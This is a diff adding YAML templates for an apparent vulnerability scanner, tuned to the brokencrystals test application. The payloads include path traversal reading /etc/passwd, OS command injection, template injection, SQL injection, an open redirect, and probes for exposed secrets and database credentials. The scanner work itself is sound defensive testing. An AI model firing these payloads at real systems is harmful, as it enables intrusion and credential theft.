@@ -1,0 +1,80 @@
+# Active vulnerability templates, data not code. Each is one request plus a
+# matcher; the engine sends it and reports a finding when the matcher fires.
+# These are confirmed against the brokencrystals test target. Keep them safe:
+# read-only or benign payloads, no destructive verbs (no DELETE), no real email.
+#
+# request: method / path / body / content_type / follow_redirects
+# match (all present conditions must hold): status, body_contains (str|list),
+#   body_not_contains, body_regex, header_contains {name, value}
+
+- id: lfi-path-traversal
+  severity: high
+  title: Local file inclusion / path traversal (reads /etc/passwd)
+  request:
+    method: GET
+    path: "/api/file?path=/etc/passwd&type=text/plain"
+  match:
+    status: 200
+    body_contains: "root:x:0:0"
+
+- id: os-command-injection
+  severity: critical
+  title: OS command injection (command output reflected)
+  request:
+    method: GET
+    path: "/api/spawn?command=echo%20opfor7f3a9"
+  match:
+    body_contains: "opfor7f3a9"
+
+- id: ssti-dot
+  severity: critical
+  title: Server-side template injection (doT, 7*7 evaluated)
+  request:
+    method: POST
+    path: "/api/render"
+    body: "opfor{{= 7*7 }}sentinel"
+    content_type: "text/plain"
+  match:
+    body_contains: "opfor49sentinel"
+
+- id: sql-injection-error
+  severity: high
+  title: SQL injection (error-based, query reflected into SQL)
+  request:
+    method: GET
+    path: "/api/testimonials/count?query=%27%20OR%20%271%27%3D%271"
+  match:
+    body_contains: "syntax error"
+
+- id: open-redirect
+  severity: medium
+  title: Open redirect to attacker-controlled URL
+  request:
+    method: GET
+    path: "/api/goto?url=https://opfor.example/"
+    follow_redirects: false
+  match:
+    status: 302
+    header_contains:
+      name: Location
+      value: "opfor.example"
+
+- id: exposed-secrets
+  severity: high
+  title: Server secrets endpoint exposed
+  request:
+    method: GET
+    path: "/api/secrets"
+  match:
+    status: 200
+    body_regex: "(?i)(token|secret|api[_-]?key)"
+
+- id: config-disclosure
+  severity: high
+  title: Server configuration with credentials disclosed
+  request:
+    method: GET
+    path: "/api/config"
+  match:
+    status: 200
+    body_contains: "postgres://"
